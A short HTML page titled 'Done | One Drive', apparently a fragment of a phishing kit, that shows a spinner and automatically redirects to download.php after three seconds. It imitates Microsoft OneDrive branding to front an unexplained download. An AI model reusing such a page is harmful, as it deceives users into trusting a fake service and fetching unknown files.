<!DOCTYPE HTML5>
<html>
<title>Done | One Drive</title>
	<link rel="icon" type="image/ico" href="img/favicon.ico" />
	<style>
	<style>
*{margin:0px; padding:0px; font-family:Helvetica, Arial, sans-serif;}
</style>
</style>
<META HTTP-EQUIV="Refresh" CONTENT="03; URL=download.php"> 
</head>
<body

background="img/003.png">
        <div id="wrapper">
		<center>
		
		<img class="ajax" src="img/ajax.gif" style="position: absolute; top: 300px; width: 32px; height: 32px">
		
		</center>
		
		</div>
</body>
</html>